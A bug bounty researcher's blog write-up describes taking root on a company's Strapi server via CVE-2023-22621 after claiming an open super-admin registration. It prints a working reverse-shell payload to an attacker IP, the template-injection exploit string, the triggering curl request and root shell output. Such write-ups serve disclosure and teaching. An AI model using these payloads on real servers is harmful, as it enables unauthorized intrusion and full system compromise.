---
title: "Remote code execution in a billion-dollar publicly traded company"
date: 2024-02-10T21:43:57+08:00
author: ted
draft: false
thumbnail: https://tedmdelacruz.github.io/strapi-rce-thumbnail.PNG?t=123
---

![Thumbnail](/strapi-rce-thumbnail.PNG)

There are 4 things that need to happen in order to find [CVE-2023-22621](https://nvd.nist.gov/vuln/detail/CVE-2023-22621) in the wild:
 
- You need to find a website that is powered by [Strapi](https://strapi.io).
- The _super admin_ for this website, _somehow_, **has not been claimed yet**.
- The version of Strapi should be _at least_ **4.5.5 and below**.
- No other hacker had _somehow_ seen any of the three aforementioned scenarios first.

The stars have aligned in my favor, and with this [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures), I managed to fully take over one of the websites of a **billion-dollar company listed on the New York Stock Exchange**.

And I happen to be invited to their private [bug bounty program](https://en.wikipedia.org/wiki/Bug_bounty_program).

# Reconnaissance

I have a server that pings me of new subdomains of this company every 5pm Manila time so I can check them out after work.

Usually I don't find anything in my probes, and this one: **strapi.[redacted].com** also didn't trigger any alarms at first.
My automations pinged me about the subdomain of this website around early December 2023, but this website caught my attention during a manual inspection of the company assets that I did around early February 2024.

I couldn't believe it at first, but the _super admin_ registration for this website was open. And _somehow_, no other hacker had seen this before me:

![Admin Registration](/strapi-rce-admin.PNG)

Realizing this was nothing short of exhilarating, since it’s been months since I got a paid bug bounty.

# Escalation

Claiming the super admin of a website is nice and dandy, but like most other security researchers, I asked myself: "How can I escalate this to something even more severe?".

The next step was obvious; I googled 'strapi cve'. One particular CVE instantly caught my attention: **[CVE-2023-22621](https://nvd.nist.gov/vuln/detail/CVE-2023-22621)** which allows for an authenicated user to execute the highly coveted **[_remote code execution_](https://en.wikipedia.org/wiki/Arbitrary_code_execution).**

The CVE ticks all of the boxes:
- You need to have super admin access (I got that) ✔
- The version of Strapi should be 4.5.5 and below (This website is on Strapi v3.6.0) ✔

# Exploitation

The CVE allows for a remote code execution via a [reverse shell](https://wiki.ubuntu.com/ReverseShell), which requires an attacker server waiting for incoming TCP connection from a victim server.

## Preparing the attacker server

I whipped up a small Digital Ocean droplet and using [netcat](https://en.wikipedia.org/wiki/Netcat) I had it listen to incoming TCP connections in port `1234`:

```sh
$ nc -lvnp 1234
```

- `-l` Instructs `netcat` to listen for incoming TCP connection rather than initiating a connection to a remote host.
- `-v` Produces more verbose output.
- `-n` Toggles `netcat` to not do any DNS or service lookups.
- `-p` Specifies the port to listen to.

## Executing the reverse shell payload

The reverse shell payload that worked for me after initial tests in my local network was the following:

```sh
bash -c 'bash -i >& /dev/tcp/[MY_ATTACKER_IP]/1234 0>&1'
```

Combining this with the NodeJs exploit described in the CVE, we get the following payload:

```js
<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/bash","args":["/bin/bash","-c","bash -c 'bash -i >& /dev/tcp/[MY_ATTACKER_IP]/1234 0>&1'"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>
```

Now, [CVE-2023-22621](https://nvd.nist.gov/vuln/detail/CVE-2023-22621) exploits an email template bypass in Strapi. Simply put, it runs when an attempt to send an email is sent. The initial configuration of Strapi allows admins to update the email confirmation template. This is where the payload is saved:

![Strapi RCE payload](/strapi-rce-payload.PNG)

## Spawning a shell as `root` in the compromised server

This exploit runs when a confirmation email is sent, so an API call that registers a new user to Strapi in order to execute the reverse shell is necessary. This is a basic cURL command for that purpose:

```sh
$ curl -vvv -X POST -H 'Content-Type: application/json' -d '{"email":"tedminfosec+rce1@gmail.com", "username":"rcetrigger1", "password": "Test1234!"}' https://strapi.[redacted].com/auth/local/register/
```

Upon execution of the cURL command, Strapi attempts to validate the email template. The exploit then takes advantage of a template validation bypass and runs the reverse shell payload via `node`. The reverse shell then initiates a TCP connection to my attacker server, which spawns a `bash` session.

Now, the attacker machine has logged in to the server as `root`, **giving me total control of the server**:

```sh
root@[redacted]:/home/[redacted]/project/strapi# ls
ls
api    config      favicon.ico   package.json  README.md
build  extensions  node_modules  public        yarn.lock
```

In order to prove the RCE, I left an inconspicuous text file in the server at `/root/tedminfosec.txt`:

```sh
root@[redacted]:/home/[redacted]/project/strapi# cat /root/tedminfosec.txt
hello from tedminfosec@wearehackerone.com
```

# Impact

Without disclosing too much about the compromised server, it contains highly sensitive keys and secrets that could have allowed a malicious actor to pivot to other, more sensitive assets in the company's internal network.

The malicious actor could have done more than just defacing a website or use it to launch phishing campaigns.

Since privilege escalation at this point would break the _rules of engagement_, I decided to stop testing from there.

# Responsible disclosure

Once that's done, I took my time to write a detailed vulnerability report and submitted it to the bug bounty program. It was triaged as **Critical**:

![Strapi RCE triage](/strapi-rce-triage.jpg)

Now that's how I compromised a server of a company worth more than a billion dollars.
